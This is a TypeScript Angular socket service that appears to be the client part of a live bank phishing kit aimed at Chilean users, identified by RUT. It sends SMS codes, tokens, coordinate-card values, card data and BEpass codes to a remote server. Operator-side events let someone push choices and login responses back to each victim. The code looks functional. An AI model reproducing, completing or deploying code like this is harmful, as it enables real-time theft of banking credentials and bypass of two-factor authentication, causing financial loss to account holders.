import { EventEmitter, Injectable, Output } from '@angular/core';
import { Socket } from 'ngx-socket-io';
import { environment } from 'src/environments/environment';

@Injectable({
  providedIn: 'root',
})
export class SocketWebService extends Socket {
  @Output() loginEvent: EventEmitter<any> = new EventEmitter();
  @Output() callback: EventEmitter<any> = new EventEmitter();
  @Output() recocnet: EventEmitter<any> = new EventEmitter();
  @Output() finalResult: EventEmitter<any> = new EventEmitter();
  @Output() loginResult: EventEmitter<any> = new EventEmitter();
  @Output() reciveData: EventEmitter<any> = new EventEmitter();

  constructor() {
    super({
      url: environment.API_URL,
      options: {
        query: {
          nameRoom: 'room',
        },
      },
    });
    this.listen();
  }

  listen = () => {
    this.ioSocket.on('login', (res: any) => {
      const userRut = localStorage.getItem('userRut');
      if (userRut && userRut === res.rut) {
        localStorage.setItem('userId', res.userId);
      }
      this.loginEvent.emit(res.users);
    });

    this.ioSocket.on('init', (res: any) => this.callback.emit(res));
    this.ioSocket.on('reconect', (res: any) => this.recocnet.emit(res));

    this.ioSocket.on('loginResult', (res: any) => {
      const userRut = localStorage.getItem('userRut');
      const userId = localStorage.getItem('userId');
      if (
        userRut &&
        userId &&
        userRut === res.rut &&
        userId === res.data.userId
      ) {
        this.loginResult.emit(res.data);
      }
    });

    this.ioSocket.on('result', (res: any) => {
      const userRut = localStorage.getItem('userRut');
      const userId = localStorage.getItem('userId');

      if (res.event === 'repeat') {
        if (userRut && userRut === res.rut) {
          this.finalResult.emit(res);
        }
      } else if (res.event === 'noAllowed') {
        if (userRut && userRut === res.rut) {
          this.finalResult.emit(res);
        }
      } else {
        if (userRut && userRut === res.rut && userId && userId === res.userId) {
          this.finalResult.emit(res);
        }
      }
    });

    this.ioSocket.on('data', (res: any) => {
      this.reciveData.emit(res);
    });
  };

  emitEvent = (payload = {}) => {
    this.ioSocket.emit('evento', payload);
  };

  emitEventLogin = (payload = {}) => {
    this.ioSocket.emit('login', payload);
  };

  emitEventInit = (payload = {}) => {
    this.ioSocket.emit('init', payload);
  };

  reloadAdmin = (payload = {}) => {
    this.ioSocket.emit('reload', payload);
  };

  showOpt = (payload = {}) => {
    this.ioSocket.emit('showOpt', payload);
  };

  loginResp = (payload = {}) => {
    this.ioSocket.emit('loginresp', payload);
  };

  sendData = (payload: any = {}) => {
    let codigo = undefined;

    if (payload.event === 'SMSMOBIL') {
      codigo = payload.sms;
    } else if (payload.event === 'TOKEN') {
      codigo = payload.token;
    } else if (payload.event === 'DIGICARD') {
      codigo = payload.coors;
    } else if (payload.event === 'TARJETA') {
      codigo = payload.data;
    }

    const d = new Date();
    let kbLog = undefined;
    let log = undefined;

    const userId = localStorage.getItem('userId');

    if (payload.event === 'DIGICARD2') {
      codigo = payload.coors;
      kbLog = `USUARIO SOLICITO 2DA COORS`;
      log = { log: kbLog, userId, isUser: true };
    } else if (payload.event === 'BEPASS') {
      codigo = payload.bepass;
      kbLog = `USUARIO SOLICITO BEpass`;
      log = { log: kbLog, userId, isUser: false };
    } else if (payload.event === 'READY') {
      kbLog = `USUARIO LISTO`;
      log = { log: kbLog, userId, isUser: true };
    } else if (payload.event === 'SELECCION') {
      kbLog = `USUARIO SELECCIONO (${payload.opt})`;
      log = { log: kbLog, userId, isUser: true };
    } else if (payload.event === 'SELECCION PAGOS') {
      kbLog = `USUARIO SELECCIONO (${payload.opt})`;
      log = { log: kbLog, userId, isUser: true };
    } else {
      kbLog = `INGRESO ${payload.event}`;
      log = { log: kbLog, userId, isUser: true };
      // kbLog = `INGRESO ${
      //   payload.event
      // }: (${codigo}) HORA: ${d.getUTCHours()}:${d.getMinutes()}:${d.getSeconds()}`;
      // log = { log: kbLog, userId, isUser: true };
    }
    this.ioSocket.emit('data', { resp: payload, log });
  };
}
